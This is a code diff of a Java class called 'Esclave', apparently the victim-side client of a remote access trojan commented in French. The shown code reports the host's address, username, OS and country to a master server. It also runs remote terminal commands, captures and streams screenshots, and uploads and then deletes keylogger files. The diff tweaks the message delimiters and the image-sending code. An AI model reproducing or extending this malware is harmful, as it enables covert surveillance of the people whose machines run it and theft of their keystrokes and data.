@@ -14,6 +14,7 @@ import remote.action.Keylogging;
 import remote.action.Notification;
 import remote.action.RemoteActions;
 import remote.action.ScreenShot;
+import send.specific.object.SendImage;
 import send.specific.object.SendSpecificObject;
 import constante.Constante;
 
@@ -89,9 +90,9 @@ public class Esclave {
 				.getProperty("os.arch"), user_country = System
 				.getProperty("user.country");
 
-		_out.writeObject(_addresse + " " + fileseparator + " "
+		_out.writeObject(_addresse + "++" + fileseparator + "++"
 				+ username 																// Envoi les proprietes au Maitre
-				+ " " + os_version + " " + os_name + " " + os_arch + " "
+				+ "++" + os_version + "++" + os_name + "++" + os_arch + "++"
 				+ user_country);
 
 		_out.flush();
@@ -102,8 +103,6 @@ public class Esclave {
 												// keylogger
 		_robot = new Robot(); // Instancie un robot
 		this.receive(this); // Instancie la reception des donnees
-
-	//	System.out.println("Connecter");
 		return true;
 		
 	}
@@ -119,13 +118,12 @@ public class Esclave {
 		Thread recevoir = new Thread("Receive") {
 			@Override
 			public void run() {
+				Object action;
 
 				try {
 					while (true) {
-						Object action;
 
 						action = _in.readObject();												// Recupere les objets du socket
-						
 						if (action instanceof Integer) 											// Gere les differents objets recus
 																								// En utilisant des codes
 						{
@@ -137,7 +135,12 @@ public class Esclave {
 							}
 							else if (code.equals(Constante.code_notif))							// Code pour afficher une notification
 							{
-								Notification notif = new Notification();
+								Object string = _in.readObject();
+								if(string instanceof String)
+								{
+									Notification notif = new Notification((String) string);
+
+								}
 							}
 							else if (code.equals(Constante.code_cmd)) 							// Code pour lancer une commande terminal
 							{
@@ -146,7 +149,6 @@ public class Esclave {
 								if (_cmd == null) 
 								{
 									_cmd = new CMD();
-									// System.out.println("[debug] New cmd");
 								}
 								action = _in.readObject();
 								if (action instanceof String) 										// Recupere l'instruction
@@ -155,7 +157,7 @@ public class Esclave {
 									String res = "";
 									res =_cmd.nouvellecommande(instruction,
 											esclave);
-									// System.out.println("[debug]"+res);
+									 System.out.println("[debug]"+res);
 
 									if (!res.equals(Constante.code_message_cmd)) 					// Renvoit l'instruction
 									{
@@ -174,22 +176,26 @@ public class Esclave {
 						else if (action instanceof RemoteActions) 									// Reception d'une requete pour VNC
 						{
 							RemoteActions remoteaction = (RemoteActions) action;
+
 							if (remoteaction instanceof ScreenShot) 
 							{
+
 								ScreenShot screenshot = (ScreenShot) remoteaction;
 								Object result = screenshot.executer(_robot);
 
 								if (result != null) 
 								{
 
+
 									byte[] size = (byte[]) screenshot.getsize();
 									if (!size.equals(null)) 
 									{
+
 										_out.writeObject(Constante.code_vnc);
 										_out.flush();
-										// System.out.println("[debug] Envoi image");
-										SendSpecificObject.sendImage(_out, size,
+										SendImage.sendImage(_out, size,
 												(byte[]) result);
+										
 									}
 								}
 							}
@@ -231,10 +237,7 @@ public class Esclave {
 	}
 
 	
-	
-	
-	
-	
+
 	public static ObjectOutputStream getOut() {
 		return _out;
 	}
@@ -249,16 +252,23 @@ public class Esclave {
 	 * @throws InterruptedException
 	 */
 	public void sendfileKeylog() throws IOException, InterruptedException {
-		String chemin = Keylogging.cheminFile;
+		String chemin = _klgg.getCheminFile();
 		_klgg.arreteKeylog();
-		SendSpecificObject.sendFile(chemin, _out);
+		SendSpecificObject.sendTxt(chemin, _out);
 		_klgg.supprimerFichier();
 		_klgg = new Keylogging();
 	}
 
 	
 	
-	
+	/**
+	 * Main de l'esclave
+	 * @param args
+	 * @throws ClassNotFoundException
+	 * @throws IOException
+	 * @throws InterruptedException
+	 * @throws AWTException
+	 */
 	public static void main(String[] args) throws ClassNotFoundException,
 			IOException, InterruptedException, AWTException {
 		_esclave = new Esclave();
